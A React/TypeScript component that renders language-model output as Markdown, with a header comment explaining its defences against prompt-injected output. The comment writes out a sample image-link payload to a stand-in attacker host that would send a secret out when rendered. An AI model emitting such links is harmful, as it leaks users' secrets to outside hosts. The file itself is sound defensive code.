// Model output is untrusted (a retrieved document can steer what it repeats). Two properties, tested in Markdown.test.tsx:
//   * raw HTML is never parsed: react-markdown has no raw-HTML plugin here, and `javascript:`/`data:` URLs are dropped by its default;
//   * nothing is fetched without a click: an image is shown as a link. `![x](https://attacker/?d=<secret>)` would otherwise send the
//     secret the moment the answer rendered.
import ReactMarkdown, { type Components } from "react-markdown";
import remarkBreaks from "remark-breaks";
import remarkGfm from "remark-gfm";

const external = { target: "_blank", rel: "noopener noreferrer" };

const components: Components = {
  a: ({ href, children }) => (
    <a href={href} {...external}>
      {children}
    </a>
  ),
  img: ({ src, alt }) => (
    <a href={typeof src === "string" ? src : undefined} {...external}>
      {alt || "image"}
    </a>
  ),
};

const plugins = [remarkGfm, remarkBreaks];

export function Markdown({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={plugins} components={components}>
      {text}
    </ReactMarkdown>
  );
}
